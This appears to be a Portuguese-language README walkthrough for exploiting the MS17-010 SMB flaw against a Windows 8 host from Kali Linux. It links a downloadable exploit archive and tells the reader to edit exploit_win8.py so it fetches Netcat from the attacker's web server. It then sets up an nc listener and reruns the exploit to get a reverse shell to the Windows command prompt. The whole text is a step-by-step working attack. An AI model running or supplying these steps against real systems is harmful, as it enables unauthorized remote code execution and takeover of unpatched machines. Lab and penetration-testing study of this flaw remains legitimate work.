Realize o download do exploit, descompacte o arquivo ms17-010.tar.gz.
<br>

https://github.com/caique-garbim/MS17-010/raw/main/ms17-010.tar.gz
```
tar xf ms17-010.tar.gz
```
```
cd ms17-010/win8
```

### Exploração
No arquivo **exploit_win8.py** é necessário realizar a seguinte alteração:
- Na linha nº 985 substitua pelo endereço IP do Kali
- Salve a alteração

![image](https://user-images.githubusercontent.com/76706456/197097891-d3b90928-60f4-4bd4-b169-c46fa5fe8f24.png)

Inicie um web server neste mesmo diretório **(em outro terminal)**:
```
python3 -m http.server 80
```
Execute o **exploit_win8.py** informando o IP do Windows alvo:
```
python2 exploit_win8.py 192.168.10.114
```
Observe que o Windows realizou a requisição para baixar o Netcat:
![image](https://user-images.githubusercontent.com/76706456/197098638-4c257045-43bb-462c-ab83-e3104b43d49b.png)

No arquivo **exploit_win8.py** é necessário realizar outra alteração:
- Comente (#) a linha nº 985
- Remova o comentário (#) da linha nº 988, substitua pelo endereço IP/porta do Kali que deseja receber a conexão reversa
- Salve as alterações

![image](https://user-images.githubusercontent.com/76706456/197099011-1fa8c55a-54ac-443c-8925-93d3bb8d6798.png)

Prepare o Kali para receber a conexão reversa:
```
rlwrap nc -vnlp 8081
```
Execute o **exploit_win8.py** informando o IP do Windows alvo **(em outro terminal)**:
```
python2 exploit_win8.py 192.168.10.114
```

Observe que a conexão reversa foi estabelecida e foi obtido acesso ao prompt de comando do Windows:
![image](https://user-images.githubusercontent.com/76706456/197099616-02297e15-8196-40cd-827a-5fce3c6263bc.png)
